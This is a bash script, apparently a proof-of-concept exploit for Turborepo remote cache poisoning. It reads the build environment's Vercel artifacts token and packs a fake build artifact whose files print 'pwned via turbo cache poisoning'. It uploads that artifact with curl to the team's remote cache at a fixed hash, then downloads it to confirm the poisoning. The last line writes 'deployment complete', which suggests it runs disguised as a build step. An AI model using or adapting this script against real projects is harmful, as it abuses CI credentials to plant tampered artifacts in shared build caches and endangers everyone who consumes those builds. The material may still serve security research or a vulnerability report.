#!/usr/bin/env bash
set -u

API="https://vercel.com/api"
TEAM="$VERCEL_ARTIFACTS_OWNER"
TOKEN="$VERCEL_ARTIFACTS_TOKEN"
HASH="4003f1ca98463840"

echo "==== STEP 1: Confirm cache token is available ===="
echo "VERCEL_ARTIFACTS_OWNER=$TEAM"
echo "VERCEL_ARTIFACTS_TOKEN=${TOKEN:0:8}..."

echo ""
echo "==== STEP 2: Create poisoned build artifact ===="
mkdir -p /tmp/poison/packages/web/dist /tmp/poison/packages/web/.turbo
echo '{"name":"youuu","version":"4.1.0","main":"index.js","scripts":{"build":"echo \"pwned via turbo cache poisoning\""}}' > /tmp/poison/packages/web/dist/package.json
echo 'console.log("pwned via turbo cache poisoning")' > /tmp/poison/packages/web/dist/index.js
echo "cache hit, replaying output $HASH" > /tmp/poison/packages/web/.turbo/turbo-build.log

tar -cf artifact.tar -C /tmp/poison packages/web/dist/ packages/web/.turbo/turbo-build.log
zstd -f artifact.tar
echo "Artifact size: $(wc -c < artifact.tar.zst) bytes"

echo ""
echo "==== STEP 3: PUT poisoned artifact to team cache at hash $HASH ===="
curl -sS -X PUT \
  "$API/v8/artifacts/$HASH?teamId=$TEAM" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/octet-stream" \
  -H "x-artifact-duration: 0" \
  --data-binary @artifact.tar.zst \
  -w '\nPUT HTTP %{http_code}\n'

echo ""
echo "==== STEP 4: GET — verify poisoned artifact is now in the team cache ===="
curl -sS \
  "$API/v8/artifacts/$HASH?teamId=$TEAM" \
  -H "Authorization: Bearer $TOKEN" \
  -o /tmp/retrieved.tar.zst \
  -w 'GET HTTP %{http_code}\n'

echo ""
echo "==== STEP 5: Decode and show poisoned content ===="
zstd -d /tmp/retrieved.tar.zst -o /tmp/retrieved.tar -f 2>/dev/null
tar -tf /tmp/retrieved.tar
echo "--- packages/web/dist/index.js ---"
tar -xf /tmp/retrieved.tar -O packages/web/dist/index.js
echo ""
echo "--- packages/web/dist/package.json ---"
tar -xf /tmp/retrieved.tar -O packages/web/dist/package.json

mkdir -p public && echo 'deployment complete' > public/index.html

